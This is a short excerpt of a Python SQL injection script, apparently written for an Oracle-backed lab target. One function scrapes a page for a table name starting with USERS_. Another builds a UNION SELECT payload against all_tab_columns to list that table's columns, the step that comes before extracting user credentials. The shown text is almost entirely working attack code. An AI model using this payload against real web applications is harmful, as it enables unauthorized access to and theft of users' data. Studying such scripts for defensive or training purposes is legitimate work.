...
def sqli_users_table(url):
    ...
    users_table = soup.find(string=re.compile("^USERS\_.*"),) # starts with USERS (^USERS), then underscore (\_), then any characters that come after (.*)
    if users_table:
        return users_table
    else:
        return False
...
def sqli_users_columns(url, users_table):
    sqli_payload = "' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = '%s'--" % users_table
    res = perform_request(url, sqli_payload)
